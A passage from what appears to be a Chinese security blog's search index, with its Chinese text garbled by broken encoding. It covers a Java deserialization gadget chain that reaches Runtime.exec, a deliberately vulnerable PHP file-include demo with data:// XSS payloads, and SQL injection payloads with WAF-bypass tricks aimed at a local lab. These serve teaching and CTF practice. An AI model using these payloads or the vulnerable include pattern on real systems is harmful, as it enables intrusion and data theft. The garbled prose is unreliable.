ReflectionObject[] reflectionChains = &#123; //è°ƒç”¨Runtime.classçš„getMethodæ–¹æ³•ï¼Œå¯»æ‰¾getRuntimeæ–¹æ³•ï¼Œå¾—åˆ°ä¸€ä¸ªMethodå¯¹è±¡(getRuntimeæ–¹æ³•) //ç­‰åŒäºŽRuntime.class.getMethod("getRuntime",new Class[]&#123;String.class,Class[].class&#125;) new ReflectionObject("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;), //è°ƒç”¨Methodçš„invokeræ–¹æ³•å¯ä»¥å¾—åˆ°ä¸€ä¸ªRuntimeå¯¹è±¡ï¼Œç­‰åŒäºŽmethod.invoke(null)ï¼Œé™æ€æ–¹æ³•ä¸ç”¨ä¼ å…¥å¯¹è±¡ new ReflectionObject("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), //è°ƒç”¨RunTimeå¯¹è±¡çš„execæ–¹æ³•ï¼Œå¹¶å°†commandä½œä¸ºå‚æ•°æ‰§è¡Œå‘½ä»¤ new ReflectionObject("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;command&#125;) &#125;; return new ReadObject(new ReflectionChains(firstObject, reflectionChains)); &#125; //åºåˆ—åŒ–å¯¹è±¡åˆ°byteæ•°ç»„ public byte[] serialize(final Object obj) throws IOException &#123; ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(obj); return out.toByteArray(); &#125; //ä»Žbyteæ•°ç»„ä¸­ååºåˆ—åŒ–å¯¹è±¡ public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException &#123; ByteArrayInputStream in = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(in); return objIn.readObject(); &#125; //å®šä¹‰ä¸€ä¸ªæœ‰æ¼æ´žçš„ç±»ï¼Œä¸»è¦æä¾›çš„åŠŸèƒ½æ˜¯æ ¹æ®è‡ªå·±å±žæ€§ä¸­çš„å€¼æ¥è¿›è¡Œåå°„è°ƒç”¨ class ReflectionObject implements Serializable&#123; private String methodName; private Class[] paramTypes; private Object[] args; public ReflectionObject(String methodName, Class[] paramTypes, Object[] args) &#123; this.methodName = methodName; this.paramTypes = paramTypes; this.args = args; &#125; //æ ¹æ®methodNameã€paramTypesæ¥å¯»æ‰¾å¯¹è±¡çš„æ–¹æ³•ï¼Œåˆ©ç”¨argsä½œä¸ºå‚æ•°è¿›è¡Œè°ƒç”¨ public Object transform(Object input) throws Exception &#123; Class inputClass = input.getClass(); return inputClass.getMethod(methodName, paramTypes).invoke(input, args); &#125; &#125; //å®šä¹‰ä¸€ä¸ªåå°„é“¾çš„ç±» class ReflectionChains implements Serializable&#123; private Object firstObject; private ReflectionObject[] reflectionObjects; public ReflectionChains(Object firstObject, ReflectionObject[] reflectionObjects) &#123; this.firstObject = firstObject; this.reflectionObjects = reflectionObjects; &#125; //éåŽ†ReflectionObjectç±»å¯¹è±¡æ•°ç»„å¹¶è°ƒç”¨å…¶transform()æ–¹æ³• public Object execute() throws Exception &#123; Object concurrentObject = firstObject; for (ReflectionObject reflectionObject : reflectionObjects) &#123; concurrentObject = reflectionObject.transform(concurrentObject); &#125; return concurrentObject; &#125; &#125; //å®šä¹‰ä¸€ä¸ªç”¨äºŽåºåˆ—åŒ–ä¸Žååºåˆ—åŒ–çš„ç±»,æ‹¥æœ‰ä¸€ä¸ªå±žæ€§å’Œä¸€ä¸ªé‡å†™äº†çš„readObject()æ–¹æ³•ï¼Œå¹¶ä¸”åœ¨readObject()æ–¹æ³•ä¸­æ‰§è¡Œäº†è¯¥å±žæ€§çš„ä¸€ä¸ªæ–¹æ³• //å½“ååºåˆ—åŒ–è¯¥ç±»å¯¹è±¡æ—¶ä¼šæ‰§è¡Œè‡ªå®šä¹‰çš„readObject()æ–¹æ³• class ReadObject implements Serializable &#123; private ReflectionChains reflectionChains; public ReadObject(ReflectionChains reflectionChains) &#123; this.reflectionChains = reflectionChains; &#125; //è‡ªå®šä¹‰readObject()ï¼Œå½“ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œè¿™ä¸ªä»£ç ä¼šè¢«è°ƒç”¨ï¼Œä¸”è¢«è°ƒç”¨çš„æ—¶å€™å…¶å±žæ€§éƒ½æ˜¯ç©º private void readObject(java.io.ObjectInputStream stream) throws IOException, ClassNotFoundException &#123; try &#123; //ç”¨æ¥æ¨¡æ‹Ÿå½“readObject()çš„æ—¶å€™ï¼Œå¯¹è‡ªèº«çš„å±žæ€§è¿›è¡Œäº†ä¸€äº›é¢å¤–çš„æ“ä½œï¼Œä»¥ç¬¦åˆååºåˆ—åŒ–æ¼æ´žç‰¹å¾ reflectionChains= (ReflectionChains) stream.readFields().get("reflectionChains",null); reflectionChains.execute(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; è¿è¡ŒåŽå¼¹å‡ºè®¡ç®—å™¨ï¼Œå³åˆ©ç”¨äº†åå°„æœºåˆ¶å®žçŽ°ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼š å‚è€ƒJavaä¸­åå°„æœºåˆ¶è¯¦è§£ Javaåå°„æœºåˆ¶Reflection]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPä¼ªåè®®]]></title>
    <url>%2F2019%2F01%2F31%2FPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[åŸºæœ¬æ¦‚å¿µPHPä¼ªåè®®åœ¨CTFä¸­ç»å¸¸ä½¿ç”¨åˆ°ï¼Œè¿™é‡Œå†™ä¸ªç®€å•çš„Demoå°ç»“ä¸€ä¸‹ï¼Œä¸»è¦å¯¹file://ã€php://filterã€php://inputã€data://ã€zip://ã€compress.bzip2://ã€compress.zlib://ã€phar://ç­‰åè®®è¿›è¡Œç®€å•çš„Demoä»‹ç»åˆ†æžã€‚ ç®€å•è¯´ä¸€ä¸‹ï¼Œfile://ç”¨äºŽè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿè¯»å–æœ¬åœ°æ–‡ä»¶ï¼›php://è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œå…¶ä¸­php://filterç”¨äºŽè¯»å–æ–‡ä»¶å†…å®¹ï¼Œphp://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŽŸå§‹æ•°æ®çš„åªè¯»æµã€åŒæ—¶å¯å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œï¼›zip://ï¼Œbzip2://ï¼Œzlib://å‡å±žäºŽåŽ‹ç¼©æµï¼Œå¯ä»¥è®¿é—®åŽ‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåŽç¼€åï¼›data://å³å†™å…¥æ•°æ®ï¼›phar://å³PHPå½’æ¡£ã€‚ ç®€å•æ–‡ä»¶åŒ…å«Demoä»£ç demo.php 1234567&lt;?php echo '&lt;h3&gt;Hi, just a test for php pseudo protocol. :)&lt;/h3&gt;'; echo '&lt;p&gt;u can input a param called "file" by GET method.&lt;/p&gt;'; if(isset($_GET["file"]))&#123; @include($_GET["file"]); &#125;?&gt; æ­£å¸¸è®¿é—®ï¼Œæç¤ºå¯ä»¥é€šè¿‡GETä¼ å…¥ä¸€ä¸ªfileå‚æ•°åŒ…å«æ–‡ä»¶ï¼š file://åè®®file://åè®®ç”¨äºŽè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶ä¸”ä¸å—allow_url_fopenä¸Žallow_url_includeçš„å½±å“ã€‚ æ³¨æ„ï¼šè¯¥åè®®çš„è·¯å¾„åªèƒ½è¾“å…¥ç»å¯¹è·¯å¾„ï¼Œè¾“å…¥ç›¸å¯¹è·¯å¾„æ˜¯ä¸ç”Ÿæ•ˆçš„ã€‚ å…ˆè¾“å…¥ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå¯ä»¥è¯»åˆ°è¯¥æ–‡ä»¶å†…å®¹ï¼Œæ¯”å¦‚CTFç»å¸¸é‡åˆ°çš„flagï¼š è¾“å…¥phpæˆ–JSæ–‡ä»¶ï¼Œfile://åè®®ä¼šæ‰§è¡Œè¯¥PHPæ–‡ä»¶é‡Œçš„ä»£ç è€Œä¸æ˜¯æ˜¾ç¤ºè¯¥å†…å®¹ï¼Œå› è€Œè¯¥åè®®ä¸é€‚ç”¨äºŽèŽ·å–æ–‡ä»¶å†…å®¹æºä»£ç ï¼ˆè€Œå¸¸ç”¨php://filterä¼ªåè®®ï¼‰ï¼š php://åè®®php://è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php://filterå’Œphp://inputï¼Œphp://filterç”¨äºŽè¯»å–æºç ï¼Œphp://inputç”¨äºŽæ‰§è¡Œphpä»£ç ã€‚ ä¸éœ€è¦å¼€å¯allow_url_fopenï¼Œä»…php://inputã€php://stdinã€ php://memoryå’Œphp://tempéœ€è¦å¼€å¯allow_url_includeã€‚ php://filteråè®®php://filteræ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºŽæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚åœ¨CTFä¸­ä¸»è¦ç”¨äºŽè¯»å–æ–‡ä»¶å†…å®¹ã€‚ä¸éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚ æŸ¥çœ‹ä¹‹å‰çš„test.jsæ–‡ä»¶ä¸ŽPHPæ–‡ä»¶ï¼š php://inputåè®®php://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŽŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨CTFä¸­å¤šç”¨äºŽæ‰§è¡Œphpä»£ç ã€‚ ä¸éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚ data://åè®®data://å³æ•°æ®ï¼Œåœ¨CTFä¸­ä¸»è¦ç”¨äºŽå†™å…¥ä»£ç å¹¶åŒ…å«è¯¥ä»£ç åˆ°å½“å‰é¡µé¢ä¸­ã€‚ å¿…é¡»åŒæ—¶å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚ ä½¿ç”¨å½¢å¼å¦‚ä¸‹ï¼š data:text/plain;base64, \alert(â€˜xssâ€™)\ data://text/plain;base64, \alert(â€˜xssâ€™)\ data:text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4= data://text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4= zip://ã€bzip2://ã€zlib://åè®®zip://ã€bzip2://ã€zlib://å‡å±žäºŽåŽ‹ç¼©æµï¼Œå¯ä»¥è®¿é—®åŽ‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåŽç¼€åã€‚ ä¸éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚ zip://åè®®zip://åŽ‹ç¼©æµï¼Œä¸éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚ ä½¿ç”¨æ–¹æ³•ï¼š zip:// [åŽ‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[åŽ‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å] æ–‡ä»¶è·¯å¾„å¿…é¡»ä¸ºç»å¯¹è·¯å¾„ã€‚ ä¸Šä¼ ä¸€ä¸ªåŒ…å«PHPä»£ç æ–‡ä»¶çš„zipåŒ…ï¼Œåªè¦zip://è®¿é—®è¯¥åè®®å³è§¦å‘æ–‡ä»¶åŒ…å«æ¼æ´žã€å°†ä»»æ„æ–‡æœ¬æ–‡ä»¶ä¸­çš„å†…å®¹å½“ä½œPHPä»£ç æ‰§è¡Œï¼š å½“ç„¶å¯ä»¥ä¿®æ”¹ä¸Šä¼ çš„zipæ–‡ä»¶åŽç¼€åä¸ºå…¶ä»–å¦‚å›¾ç‰‡åŽç¼€ï¼Œæ ¹æ®ç‰¹å®šæƒ…å†µå¯ç»•è¿‡ä¸€äº›ä¸Šä¼ æ–‡ä»¶ç±»åž‹çš„é™åˆ¶ï¼š zlib://åè®®zlib://åŽ‹ç¼©æµï¼Œä¸éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚ ä½¿ç”¨æ–¹æ³•ï¼š compress.zlib://file æ–‡ä»¶æ— ç»å¯¹è·¯å¾„é™åˆ¶ã€‚ bzip2://åè®®bzip2://åŽ‹ç¼©æµï¼Œä¸éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_includeã€‚ ä½¿ç”¨æ–¹æ³•ï¼š compress.bzip2://file æ–‡ä»¶æ— ç»å¯¹è·¯å¾„é™åˆ¶ã€‚ å¯æ˜¯è¿™é‡Œæ€Žä¹ˆæµ‹è¯•éƒ½ä¸æˆåŠŸï¼Œé€šè¿‡phpinfoæŸ¥çœ‹bzip2://æ˜¯enableä¸”æ–‡ä»¶ç±»åž‹å’Œæ–‡ä»¶è·¯å¾„éƒ½è¿›è¡Œå°è¯•ï¼ŒPHPç‰ˆæœ¬ä¹Ÿæ¢äº†å‡ ä¸ªï¼Œè¿˜æ˜¯æ— æ³•æ˜¾ç¤ºphpinfoä¿¡æ¯ï¼Œå“ªä½çŸ¥é“åŽŸå› çš„å¤§ä½¬è¯·æŒ‡ç‚¹ä¸€ä¸‹ : ) phar://åè®®phar://å³PHPå½’æ¡£ï¼Œå¸¸ç”¨äºŽè§£æžpharæ–‡ä»¶å†…å®¹ï¼Œæœ€è¿‘çš„CTFä¸­å¤šç”¨äºŽpharååºåˆ—åŒ–æ¼æ´žåˆ©ç”¨ã€‚ååºåˆ—åŒ–æ¼æ´žå…·ä½“çš„åˆ©ç”¨å¯å‚è€ƒhttps://blog.csdn.net/SKI_12/article/details/85551194]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¸¸è§Webæ¼æ´žç±»åž‹æ€»ç»“]]></title>
    <url>%2F2019%2F01%2F30%2F%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[è¿™é‡Œå°ç»“ä¸€ä¸‹å¸¸è§çš„Webæ¼æ´žç±»åž‹ï¼Œå¾…å®Œå–„ã€‚ SQLæ³¨å…¥ä¸ŽSQLç›²æ³¨ä¸€ã€åŸºæœ¬æ¦‚å¿µæ¼æ´žå®šä¹‰ SQLæ³¨å…¥æ¼æ´žä½œä¸ºOWASP TOP10ä¸­é‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œå¯è§å…¶å®‰å…¨æ€§çš„å±å®³æœ‰å¤šå¤§ã€‚ç®€å•åœ°è¯´ï¼ŒSQLæ³¨å…¥å°±æ˜¯é€šè¿‡æž„å»ºç‰¹æ®Šçš„å…·æœ‰SQLè¯­æ³•çš„è¯­å¥ï¼Œç»•åˆ°æ•°æ®åº“ä¸­è¿›è€Œæ‰§è¡Œç›¸åº”çš„æ“ä½œçš„æ¼æ´žã€‚æ”»å‡»è€…åˆ©ç”¨è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥è®¿é—®æˆ–ä¿®æ”¹æ•°æ®ï¼Œæˆ–è€…åˆ©ç”¨æ½œåœ¨çš„æ•°æ®åº“æ¼æ´žè¿›è¡Œæ”»å‡»ã€‚ æˆå›  é’ˆå¯¹SQLæ³¨å…¥çš„æ”»å‡»è¡Œä¸ºå¯æè¿°ä¸ºé€šè¿‡åœ¨ç”¨æˆ·å¯æŽ§å‚æ•°ä¸­æ³¨å…¥SQLè¯­æ³•ï¼Œç ´ååŽŸæœ‰SQLç»“æž„ï¼Œè¾¾åˆ°ç¼–å†™ç¨‹åºæ—¶æ„æ–™ä¹‹å¤–ç»“æžœçš„æ”»å‡»è¡Œä¸ºã€‚å…¶æˆå› å¯ä»¥å½’ç»“ä¸ºä»¥ä¸‹ä¸¤ä¸ªåŽŸå› å åŠ é€ æˆçš„ï¼š ç¨‹åºç¼–å†™è€…åœ¨å¤„ç†åº”ç”¨ç¨‹åºå’Œæ•°æ®åº“äº¤äº’æ—¶ï¼Œä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æŽ¥çš„æ–¹å¼æž„é€ SQLè¯­å¥ æœªå¯¹ç”¨æˆ·å¯æŽ§å‚æ•°è¿›è¡Œè¶³å¤Ÿçš„è¿‡æ»¤ä¾¿å°†å‚æ•°å†…å®¹æ‹¼æŽ¥è¿›å…¥åˆ°SQLè¯­å¥ä¸­ æ”»å‡»æ–¹å¼ SQLæ³¨å…¥çš„æ”»å‡»æ–¹å¼æ ¹æ®åº”ç”¨ç¨‹åºå¤„ç†æ•°æ®åº“è¿”å›žå†…å®¹çš„ä¸åŒï¼Œå¯ä»¥åˆ†ä¸ºåŸºäºŽæŠ¥é”™çš„æ³¨å…¥ã€åŸºäºŽå¸ƒå°”çš„æ³¨å…¥å’Œç›²æ³¨ã€‚ â€‹ åŸºäºŽæŠ¥é”™çš„æ³¨å…¥ï¼šæ•°æ®åº“æŸ¥è¯¢è¿”å›žç»“æžœå¹¶æ²¡æœ‰åœ¨é¡µé¢ä¸­æ˜¾ç¤ºï¼Œä½†æ˜¯åº”ç”¨ç¨‹åºå°†æ•°æ®åº“æŠ¥é”™ä¿¡æ¯æ‰“å°åˆ°äº†é¡µé¢ä¸­ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥æž„é€ æ•°æ®åº“æŠ¥é”™è¯­å¥ï¼Œä»ŽæŠ¥é”™ä¿¡æ¯ä¸­èŽ·å–æƒ³è¦èŽ·å¾—çš„å†…å®¹ï¼Œå¦‚æ³¨å…¥å„ç§ç¬¦å·ä»¥åŠç»„åˆï¼š â€˜ â€œ ( % â€‹ åŸºäºŽå¸ƒå°”çš„æ³¨å…¥ï¼šæ”»å‡»è€…å¯ä»¥ç›´æŽ¥åœ¨å½“å‰ç•Œé¢å†…å®¹ä¸­èŽ·å–æƒ³è¦èŽ·å¾—çš„å†…å®¹ï¼Œå¦‚æ³¨å…¥ï¼š1â€™ and â€˜1â€™=â€™1å’Œ1â€™ and â€˜1â€™=â€™2 ç›¸å½“äºŽ 1â€™ and â€˜1å’Œ1â€™ and â€˜0ï¼Œå½“è¿”å›žçš„ç»“æžœä¸åŒæ—¶å³æœ‰æ¼æ´ž ç›²æ³¨ï¼šæ•°æ®åº“æŸ¥è¯¢ç»“æžœæ— æ³•ä»Žç›´è§‚é¡µé¢ä¸­èŽ·å–ï¼Œæ”»å‡»è€…é€šè¿‡ä½¿ç”¨æ•°æ®åº“é€»è¾‘æˆ–ä½¿æ•°æ®åº“åº“æ‰§è¡Œå»¶æ—¶ç­‰æ–¹æ³•èŽ·å–æƒ³è¦èŽ·å¾—çš„å†…å®¹ â€‹ åˆ¤æ–­ç›²æ³¨çš„å¸¸è§ç”¨æ³•ï¼š 121â€™ and 1=1 #1â€™ and 1=2 # â€‹ åˆ¤æ–­è¿™ä¸¤ç§ä¸åŒçš„è¾“å…¥æ˜¯å¦æœ‰ä¸ä¸€æ ·çš„æ˜¾ç¤ºï¼Œå¦‚æžœä¸€ä¸ªæ­£å¸¸ä¸€ä¸ªé€šç”¨çš„é”™è¯¯æç¤ºæˆ–è€…å•¥ä¹Ÿä¸æ˜¾ç¤ºï¼Œåˆ™å‡ ä¹Žå¯ä»¥ç¡®å®šæ˜¯å«æœ‰SQLæ³¨å…¥æ¼æ´žçš„ã€‚ â€‹ åŸºäºŽå¸ƒå°”çš„æ³¨å…¥ä»£ç ç¤ºä¾‹ï¼š 1http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=1 --+ â€‹ åŸºäºŽæŠ¥é”™çš„æ³¨å…¥ä»£ç ç¤ºä¾‹ï¼š 1http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=0 union select 1,count(*),concat((select email_id from emails where id=5),0x2a,floor(rand(0)*2))x from users group by x--+ â€‹ ç›²æ³¨ä»£ç ç¤ºä¾‹ï¼š 1http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and (select substr(email_id,1,1) from emails where id=3) &gt; 'a' --+ å‡ ä¸ªå¸¸ç”¨çš„å‡½æ•° â€‹ user()è¿”å›žå½“å‰æ•°æ®åº“è¿žæŽ¥ä½¿ç”¨çš„ç”¨æˆ·ï¼› â€‹ database()è¿”å›žå½“å‰æ•°æ®åº“è¿žæŽ¥ä½¿ç”¨çš„æ•°æ®åº“ï¼› â€‹ version()è¿”å›žå½“å‰æ•°æ®åº“çš„ç‰ˆæœ¬ï¼› â€‹ concatæˆ–è€…concat-wså‡½æ•°å¯ä»¥å°†è¿™äº›å‡½æ•°è¿›è¡Œç»„åˆä½¿ç”¨å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚concatå‡½æ•°ä¸­ï¼Œå°†å…¶ä¸­çš„å‚æ•°ç›´æŽ¥è¿žæŽ¥èµ·æ¥äº§ç”Ÿæ–°çš„å­—ç¬¦ä¸²ã€‚è€Œåœ¨concat_wså‡½æ•°ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨äºŽä½œä¸ºåˆ†éš”ç¬¦å°†åŽé¢å„ä¸ªå‚æ•°çš„å†…å®¹åˆ†éš”å¼€æ¥å†è¿›è¡Œç›¸åº”çš„è¿žæŽ¥äº§ç”Ÿæ–°çš„å­—ç¬¦ä¸²ã€‚ä»¥å…¶å¸¸ç”¨çš„ä¾‹å­ä¸ºä¾‹ï¼š 1concat_ws(char(32,58,32),user(),database(),version()) â€‹ å…¶ä¸­char()å‡½æ•°ä¸ºå°†é‡Œé¢çš„å‚æ•°è½¬åŒ–ä¸ºç›¸åº”çš„å­—ç¬¦ï¼Œå…¶ä¸­32ä¸ºç©ºæ ¼ï¼Œ58ä¸ºå†’å·(:)ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼å¯ä»¥ç»•è¿‡ä¸€äº›ç®€å•çš„è¿‡æ»¤æœºåˆ¶ã€‚ å‡ ä¸ªå¸¸ç”¨çš„å…¨å±€å‡½æ•° â€‹ @@datadir @@hostname @@VERSION @@version_compile_os å±å®³ æ”»å‡»è€…åˆ©ç”¨SQLæ³¨å…¥æ¼æ´žï¼Œå¯ä»¥èŽ·å–æ•°æ®åº“ä¸­çš„å¤šç§ä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼šç®¡ç†å‘˜åŽå°å¯†ç ï¼‰ï¼Œä»Žè€Œè„±å–æ•°æ®åº“ä¸­å†…å®¹ï¼ˆè„±åº“ï¼‰ã€‚åœ¨ç‰¹åˆ«æƒ…å†µä¸‹è¿˜å¯ä»¥ä¿®æ”¹æ•°æ®åº“å†…å®¹æˆ–è€…æ’å…¥å†…å®¹åˆ°æ•°æ®åº“ï¼Œå¦‚æžœæ•°æ®åº“æƒé™åˆ†é…å­˜åœ¨é—®é¢˜ï¼Œæˆ–è€…æ•°æ®åº“æœ¬èº«å­˜åœ¨ç¼ºé™·ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡SQLæ³¨å…¥æ¼æ´žç›´æŽ¥èŽ·å–webshellæˆ–è€…æœåŠ¡å™¨ç³»ç»Ÿæƒé™ã€‚ äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•1ã€å¤§å°å†™ç»•è¿‡ â€‹ å¦‚ï¼š?id=1â€™ uNiOn SElecT * FrOm users # 2ã€ç®€å•ç¼–ç ç»•è¿‡ â€‹ å¦‚URLç¼–ç ã€åŒé‡URLç¼–ç ã€Hexç¼–ç ã€Unicodeç¼–ç ç­‰ã€‚ â€‹ ?id=1%252f%252a*/UNION%252f%252a /SELECT â€‹ id=-15 /!u%6eion/ /!se%6cect/ 1,2,3,4â€¦ â€‹ ?id=10%D6â€˜%20AND%201=2%23 â€‹ SELECT â€˜Ã„â€™=â€™Aâ€™; #1 3ã€æ³¨é‡Šç»•è¿‡ â€‹ å¦‚?id=1 uni//on sele//ct 1,2,3 # 4ã€åˆ†éš”é‡å†™ç»•è¿‡ â€‹ é€‚ç”¨äºŽWAFé‡‡ç”¨æ­£åˆ™è¡¨è¾¾å¼æ£€æµ‹æ‰€æœ‰çš„æ•æ„Ÿå­—çš„æƒ…å†µï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šåˆ†å¼€æ•æ„Ÿå­—ï¼Œå¦‚?id=1 un//ion sel//ect 1,2,3 #ï¼›è‡³äºŽé‡å†™ç»•è¿‡ï¼Œé€‚ç”¨äºŽWAFè¿‡æ»¤äº†ä¸€æ¬¡çš„æƒ…å†µï¼Œå¦‚uniuniononï¼Œæœ‰æ—¶å€™å¯èƒ½è¿˜æœ‰å¤šæ¬¡è¿‡æ»¤çš„æƒ…å†µï¼Œè¿™æ—¶å¤šæ¬¡å°è¯•ä¹Ÿå¯ä»¥ã€‚ 5ã€HTTPå‚æ•°æ±¡æŸ“(HPP)ï¼š â€‹ å¦‚?id=1 union select 1,2,3 from users where id=1 # â€‹ è¿™æ—¶å¯ä»¥æ”¹ä¸º?id=1 union select 1&amp;id=2,3 from users where id=1 # â€‹ æ¬¡æ•°&amp;id=ä¼šåœ¨æŸ¥è¯¢æ—¶å˜æˆé€—å·ï¼Œå…·ä½“ç»†èŠ‚å–å†³äºŽ WAF ï¼› â€‹ è¿™ä¸ªä¾‹å­ä¹ŸåŒç†ï¼š?id=1//union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=/users # â€‹ å¦‚æžœæœåŠ¡å™¨ä»£ç ä¸ºï¼š select from table where a=â€.$_GET[â€˜aâ€™].â€ and b=â€.$_GET[â€˜bâ€™].â€ limit â€œ.$_GET[â€˜câ€™]; é‚£ä¹ˆå¯ä»¥æž„é€ è¿™æ ·çš„æ³¨å…¥è¯­å¥ï¼š ?a=1 union/&amp;b=/select 1,pass/&amp;c=/from users # æœ€ç»ˆè§£æžä¸ºï¼š select from table where a=1 union/ and b=/select 1,pass/limit /from users # å¯ä»¥çœ‹åˆ°ï¼Œè¿™ç§æ–¹å¼æ¯”è¾ƒé€‚åˆç™½ç›’æµ‹è¯•ã€‚ 6ã€ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦ or /and ç»•è¿‡ â€‹ å¦‚?id=1 or 0x50=0x50 â€‹ ?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74ï¼Œå…¶ä¸­select pwd from users limit 1,1æ˜¯ä»Ž users è¡¨é‡ŒæŸ¥è¯¢ pwd å­—æ®µçš„ç¬¬ä¸€æ¡è®°å½•ï¼Œ ç„¶åŽ mid()å°±æ˜¯å–è¯¥è®°å½•çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œ lower()æŠŠå­—ç¬¦è½¬æ¢ä¸ºå°å†™ï¼Œ ascii æŠŠ è¯¥å­—ç¬¦è½¬æ¢æˆ ascii ç ï¼Œæœ€åŽåˆ¤æ–­ç­‰ä¸ç­‰äºŽ 74ã€‚ 7ã€æ¯”è¾ƒæ“ä½œç¬¦æ›¿æ¢ â€‹ æ¯”è¾ƒæ“ä½œç¬¦å¦‚!=ã€&lt;&gt;ã€&lt;ã€&gt;éƒ½å¯ä»¥ç”¨æ¥æ›¿æ¢=æ¥ç»•è¿‡ã€‚ 8ã€åŒåŠŸèƒ½å‡½æ•°æ›¿æ¢ â€‹ substring()å¯ä»¥ç”¨mid()ã€substr()è¿™äº›å‡½æ•°æ¥æ›¿æ¢ï¼Œéƒ½æ˜¯ç”¨æ¥å–å­—ç¬¦ä¸²çš„æŸä¸€ä½å­—ç¬¦çš„ï¼› â€‹ ascii()ç¼–ç å¯ä»¥ç”¨ hex()ã€bin()ï¼Œå³åå…­è¿›åˆ¶å’ŒäºŒè¿›åˆ¶ç¼–ç æ›¿æ¢ï¼› â€‹ åœ¨ä½¿ç”¨åœ¨åŸºäºŽå»¶æ—¶çš„ç›²æ³¨ä¸­benchmark()å’Œsleep()å¯ä»¥ç›¸äº’æ›¿æ¢ï¼› â€‹ group_concat ã€ concat ã€concat_ws ä¸‰è€…å¯ä»¥äº’ç›¸æ›¿æ¢ï¼› â€‹ è¿˜æœ‰ä¸€ç§æ–°çš„æ–¹æ³• ï¼Œ3æ¡è¯­å¥åˆ†åˆ«å¦‚ä¸‹ 123substring((select â€˜passwordâ€™),1,1) = 0x70substr((select â€˜passwordâ€™),1,1) = 0x70mid((select â€˜passwordâ€™),1,1) = 0x70 â€‹ éƒ½æ˜¯ä»Ž password é‡Œåˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„å€¼ï¼Œå¯ä»¥ç”¨ 123strcmp(left(â€˜passwordâ€™,1), 0x69) = 1strcmp(left(â€˜passwordâ€™,1), 0x70) = 0strcmp(left(â€˜passwordâ€™,1), 0x71) = -1 â€‹ æ›¿æ¢ï¼Œleft ç”¨æ¥å–å­—ç¬¦ä¸²å·¦èµ· 1 ä½çš„å€¼ï¼Œstrcmp 